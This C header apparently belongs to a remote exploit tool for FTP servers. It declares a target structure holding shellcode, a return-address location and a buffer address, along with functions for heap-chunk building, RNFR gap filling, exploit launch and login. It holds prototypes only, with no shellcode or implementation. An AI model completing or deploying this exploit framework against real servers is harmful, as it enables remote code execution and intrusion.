#ifndef _EXPLOIT_H_
#define _EXPLOIT_H_

typedef struct {
    char *                  desc;           /* distribution */
    char *                  banner;         /* ftp banner part */
    unsigned char *         shellcode;
    unsigned int            shellcode_len;

    unsigned long int       retloc;         /* return address location */
    unsigned long int       cbuf;           /* &cbuf[0] */
} target_t;

target_t * target_from_banner (unsigned char *banner);

int exploit (int fd, target_t *tgt);

void xp_buildsize (int fd, unsigned char this_size_ls,
        unsigned long int csize);
void xp_gapfill (int fd, int rnfr_num, int rnfr_size);
int xp_build (target_t *tgt, unsigned char *buf, unsigned long int buf_len);
void xp_buildchunk (target_t *tgt, unsigned char *cspace, unsigned int clen);

void ftp_escape (unsigned char *buf, unsigned long int buflen);
void ftp_recv_until (int sock, char *buff, int len, char *begin);
int ftp_login (char *host, char *user, char *pass, char **banner);
int telnet_login (char *host);

unsigned long int net_resolve (char *host);
int net_connect (struct sockaddr_in *cs, char *server,
        unsigned short int port, int sec);
void net_write (int fd, const char *str, ...);
int net_rtimeout (int fd, int sec);
int net_rlinet (int fd, char *buf, int bufsize, int sec);

#endif
